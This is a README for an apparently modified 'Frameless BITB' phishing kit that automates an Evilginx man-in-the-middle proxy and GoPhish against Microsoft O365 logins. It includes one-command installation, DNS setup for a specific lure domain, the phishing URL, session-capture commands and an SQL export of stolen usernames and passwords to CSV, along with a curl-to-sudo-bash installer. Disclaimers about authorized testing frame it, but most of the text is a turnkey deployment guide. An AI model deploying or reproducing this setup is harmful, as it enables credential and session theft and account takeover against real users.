# Frameless BITB - Fully Automated Setup 🚀

**Google Cloud Shell Ready | One-Command Installation | Production Deployment**

This enhanced version provides fully automated installation for Google Cloud Shell and any Debian/Ubuntu-based system, complete with Evilginx, GoPhish integration, and production-ready configurations.

## ⚡ Quick Start (3 Easy Steps)

### 1. Configure DNS
Point your domain to your server:
```
A Record: exodustraderai.info → YOUR_SERVER_IP
A Record: *.exodustraderai.info → YOUR_SERVER_IP
```

### 2. Run Installation
Open Google Cloud Shell and execute:
```bash
git clone https://github.com/waelmas/frameless-bitb.git
cd frameless-bitb
sudo bash setup-gcloud.sh
```

### 3. Done!
Access your phishing page at:
```
https://login.exodustraderai.info/?auth=2
```

**Installation Time: 15-30 minutes** (fully automated)

## 🎯 What's New in Automated Version

### ✨ Key Features

- ✅ **One-Command Installation** - No manual configuration needed
- ✅ **Google Cloud Shell Optimized** - Works out of the box
- ✅ **GoPhish Integration** - Campaign management included
- ✅ **Automatic SSL** - Let's Encrypt with self-signed fallback
- ✅ **Systemd Services** - Auto-start on boot
- ✅ **Firewall Configuration** - UFW security rules
- ✅ **Validation Scripts** - Automated testing and verification
- ✅ **Management Tools** - Simple service control commands
- ✅ **Session Monitoring** - Real-time capture tracking
- ✅ **CSV Export** - Easy data extraction
- ✅ **Email Templates** - Pre-built phishing templates

### 📦 Complete Stack

| Component | Purpose | Port |
|-----------|---------|------|
| **Evilginx** | Man-in-the-middle framework | 8443 (internal) |
| **GoPhish** | Campaign management | 3333 (admin) |
| **Apache2** | Reverse proxy + substitution | 443 (HTTPS) |
| **Frameless BITB** | Non-iframe browser window | - |

## 📖 Documentation

- **[INSTALL.md](INSTALL.md)** - Complete installation guide
- **[QUICKSTART.md](QUICKSTART.md)** - Quick reference and commands
- **[README.md](README.md)** - Original manual setup (legacy)

## 🔧 Installation Options

### Option 1: Default Installation (Recommended)
```bash
git clone https://github.com/waelmas/frameless-bitb.git
cd frameless-bitb
sudo bash setup-gcloud.sh
```

### Option 2: Custom Domain
```bash
sudo DOMAIN=yourdomain.com EMAIL=admin@yourdomain.com bash setup-gcloud.sh
```

### Option 3: Configuration File
```bash
nano config.env  # Edit settings
source config.env
sudo -E bash setup-gcloud.sh
```

### Option 4: One-Liner (Future)
```bash
curl -fsSL https://raw.githubusercontent.com/waelmas/frameless-bitb/main/install.sh | sudo bash
```

## 🎮 Management Commands

After installation, manage your setup with:

```bash
bitb-start   # Start all services
bitb-stop    # Stop all services
bitb-status  # Check service status
bitb-logs    # View logs
```

## 🔍 Validation & Testing

Verify your installation:

```bash
sudo bash test-setup.sh
```

Checks performed:
- ✓ System requirements
- ✓ Network configuration
- ✓ Package installation
- ✓ Service status
- ✓ Port availability
- ✓ SSL certificates
- ✓ File structure
- ✓ Web endpoints
- ✓ Configurations
- ✓ Firewall rules

## 🎣 Using Your Phishing Setup

### 1. Access Phishing Page
```
https://login.exodustraderai.info/?auth=2
```

### 2. Manage Evilginx
```bash
cd /opt/evilginx
tmux attach-session -t evilginx
```

Common commands:
```
sessions          # View captured sessions
sessions [ID]     # View session details
lures             # List lures
lures get-url 0   # Get phishing URL
```

### 3. Access GoPhish Admin
```
https://YOUR_SERVER_IP:3333
```
- Login with credentials shown on first access
- Change password immediately

### 4. Monitor Captures
```bash
sudo bash gophish-integration.sh
```
- Real-time session monitoring
- Export to CSV
- Sync with GoPhish campaigns

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                         Internet                        │
└───────────────────┬─────────────────────────────────────┘
                    │
         ┌──────────▼──────────┐
         │   Apache (Port 443) │
         │   - SSL Termination │
         │   - Content Subst.  │
         └──────────┬──────────┘
                    │
         ┌──────────▼──────────┐
         │ Evilginx (Port 8443)│
         │   - MitM Proxy      │
         │   - Session Capture │
         └──────────┬──────────┘
                    │
         ┌──────────▼──────────┐
         │   Microsoft O365    │
         │  (login.live.com)   │
         └─────────────────────┘

         ┌──────────────────────┐
         │ GoPhish (Port 3333)  │
         │ - Campaign Mgmt      │
         │ - Email Templates    │
         └──────────────────────┘
```

## 🎨 Customization

### Change Domain
```bash
# Update all configs
sudo find /etc/apache2 /var/www -type f -exec sed -i 's/exodustraderai\.info/newdomain.com/g' {} \;
sudo systemctl restart apache2
```

### Switch BITB Style
```bash
sudo nano /etc/apache2/sites-enabled/000-default.conf
# Change: mac-chrome.conf → win-chrome.conf
sudo systemctl restart apache2
```

### Customize Pages
```bash
sudo nano /var/www/primary/index.html  # Background page
sudo nano /var/www/secondary/script.js # BITB window
```

### Add Phishlets
```bash
sudo cp your-phishlet.yaml /opt/evilginx/phishlets/
cd /opt/evilginx
./evilginx -developer
> phishlets hostname your-phishlet exodustraderai.info
> phishlets enable your-phishlet
```

## 🔐 Security Considerations

**⚠️ CRITICAL - READ CAREFULLY**

This tool is for **AUTHORIZED TESTING ONLY**:
- ✅ Security research
- ✅ Penetration testing (with permission)
- ✅ Red team exercises
- ✅ Educational purposes

**NEVER:**
- ❌ Attack systems without authorization
- ❌ Steal credentials
- ❌ Violate laws or regulations
- ❌ Harm others

### Best Practices

1. **Change default passwords** immediately
2. **Use IP whitelisting** for admin panels
3. **Monitor logs** regularly
4. **Keep software updated**
5. **Use strong encryption**
6. **Document all testing**
7. **Get written permission**

## 🐛 Troubleshooting

### Installation Failed
```bash
# Check validation
sudo bash test-setup.sh

# View logs
bitb-logs

# Check specific service
sudo journalctl -u evilginx -f
sudo journalctl -u gophish -f
```

### Services Won't Start
```bash
# Check ports
sudo netstat -tulpn | grep -E ':(80|443|53|3333|8443)'

# Fix DNS
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Restart services
bitb-stop
bitb-start
```

### SSL Issues
```bash
# Check certificates
sudo certbot certificates

# Manual Let's Encrypt
sudo certbot certonly --manual --preferred-challenges dns \
  -d exodustraderai.info -d *.exodustraderai.info

# Or use self-signed (auto-generated)
```

### DNS Not Resolving
```bash
# Check DNS
dig exodustraderai.info
nslookup login.exodustraderai.info

# Wait for propagation (up to 48 hours)
# Use DNS checkers: whatsmydns.net
```

## 📁 File Structure

```
frameless-bitb/
├── setup-gcloud.sh           # Main installation script
├── gophish-integration.sh    # Evilginx-GoPhish sync
├── test-setup.sh             # Validation script
├── install.sh                # One-liner installer
├── config.env                # Configuration file
├── INSTALL.md                # Full installation guide
├── QUICKSTART.md             # Quick reference
├── README-AUTOMATED.md       # This file
├── README.md                 # Original manual setup
├── O365.yaml                 # Office 365 phishlet
├── pages/                    # Web page templates
│   ├── home/                 # Landing page
│   ├── primary/              # Background page
│   └── secondary/            # BITB window
├── custom-subs/              # Apache substitutions
│   ├── mac-chrome.conf
│   └── win-chrome.conf
└── apache-configs/           # Apache templates
    ├── mac-chrome-bitb.conf
    └── win-chrome-bitb.conf
```

## 🔄 Backup & Recovery

### Create Backup
```bash
sudo mkdir -p /backups
sudo tar -czf /backups/evilginx-$(date +%Y%m%d).tar.gz /root/.evilginx/
sudo tar -czf /backups/gophish-$(date +%Y%m%d).tar.gz /opt/gophish/
sudo tar -czf /backups/apache-$(date +%Y%m%d).tar.gz /etc/apache2/
sudo tar -czf /backups/www-$(date +%Y%m%d).tar.gz /var/www/
```

### Restore Backup
```bash
sudo tar -xzf /backups/evilginx-YYYYMMDD.tar.gz -C /
sudo tar -xzf /backups/gophish-YYYYMMDD.tar.gz -C /
bitb-stop && bitb-start
```

## 📊 Monitoring & Analytics

### View Captured Sessions
```bash
# Evilginx database
sudo sqlite3 /root/.evilginx/data.db "SELECT * FROM sessions;"

# Use integration tool
sudo bash gophish-integration.sh
# Select option 6 for statistics
```

### Real-Time Monitoring
```bash
# Apache access logs
sudo tail -f /var/log/apache2/access_evilginx.log

# Evilginx logs
sudo journalctl -u evilginx -f

# Integration tool
sudo bash gophish-integration.sh
# Select option 2 for real-time monitoring
```

### Export Data
```bash
# CSV export
sudo bash gophish-integration.sh
# Select option 3 to export to CSV

# Direct SQL query
sudo sqlite3 /root/.evilginx/data.db \
  "SELECT username, password, created_at FROM sessions;" \
  -csv > sessions.csv
```

## 🎓 Learning Resources

### Official Documentation
- [Evilginx Documentation](https://help.evilginx.com/)
- [GoPhish User Guide](https://docs.getgophish.com/)
- [Apache mod_substitute](https://httpd.apache.org/docs/2.4/mod/mod_substitute.html)

### Courses & Training
- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
- [Red Team Operations](https://www.offensive-security.com/)

### Related Projects
- [Original BITB](https://github.com/mrd0x/BITB)
- [Evilginx Resources](https://janbakker.tech/evilginx-resources-for-microsoft-365/)

## 🤝 Contributing

Contributions welcome! Areas for improvement:
- Additional phishlets
- More BITB browser styles
- Enhanced obfuscation
- Better integration features
- Documentation improvements

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/waelmas/frameless-bitb/issues)
- **Original Author**: [@waelmas](https://github.com/waelmas)
- **Evilginx**: [@kgretzky](https://github.com/kgretzky)

## 🙏 Credits

- **Frameless BITB**: [@waelmas](https://github.com/waelmas)
- **Original BITB**: [@mrd0x](https://github.com/mrd0x)
- **Evilginx**: [@kgretzky](https://github.com/kgretzky)
- **GoPhish**: [GoPhish Team](https://github.com/gophish/gophish)

## ⚖️ License & Legal

**Educational and Authorized Testing Only**

By using this software, you agree to:
- Use only for legal and authorized purposes
- Obtain written permission before testing
- Comply with all applicable laws
- Accept full responsibility for your actions

The authors are not responsible for misuse.

## 🎯 Use Cases

### Legitimate Use Cases
- Security awareness training
- Authorized penetration testing
- Red team exercises
- Security research
- Educational demonstrations

### Setup Process
1. Get written authorization
2. Define scope and rules
3. Install and configure
4. Execute controlled test
5. Document findings
6. Provide remediation guidance

## 📈 Roadmap

### Planned Features
- [ ] Multi-phishlet support
- [ ] Advanced obfuscation
- [ ] Cloudflare integration
- [ ] Docker deployment
- [ ] Kubernetes support
- [ ] Automated reporting
- [ ] Mobile device detection
- [ ] Custom analytics dashboard

## ⭐ Star This Repository

If you find this useful, please star the repository!

---

**Made with ❤️ for security research and education**

**Hack the Planet (Responsibly)! 🌍🔒**

---

## 🚨 Final Warning

**USE RESPONSIBLY - GET AUTHORIZATION - FOLLOW THE LAW**

Unauthorized access to computer systems is illegal in most jurisdictions and can result in:
- Criminal charges
- Civil lawsuits
- Fines and imprisonment
- Professional consequences

**Only use this tool for authorized, legal, and ethical purposes.**

---

**Version: 2.0 Automated | Last Updated: 2024**
